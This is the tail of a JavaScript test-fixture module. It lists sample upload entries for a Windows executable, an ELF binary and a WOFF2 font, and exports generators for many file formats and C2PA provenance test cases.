    { name: 'Windows program', key: 'uploads/setup.exe', bytes: exe(), worker: null, group: 'programs' },
    { name: 'ELF program', key: 'uploads/tool', bytes: elf(), worker: null, group: 'programs' },
    { name: 'WOFF2 font', key: 'uploads/font.woff2', bytes: woff2(), worker: null, group: 'programs' },
  ]
  return entries
}

module.exports = {
  enc, bytes, latin1, utf16le, utf16be, u16be, u16le, u32be, u32le, mulberry32, randomBytes,
  jpegSegment, entropyCoded, jpeg, comSegment, APP_PADDING, png, pngChunk, gif, gifSubBlocks, webp, webpChunk,
  isoBox, ftyp, avif, MOOV, MDAT, META, quickTime, C2PA_UUID, ICON_SVG, jumbf, c2paCarriers, C2PA_ICONS,
  BYPASSES, bypassCarriers, brandCases, catalogue,
  bmp, tiffLe, tiffBe, heic, heifMif1, pdf, zip, zipEntry, xlsx, html, svg,
}
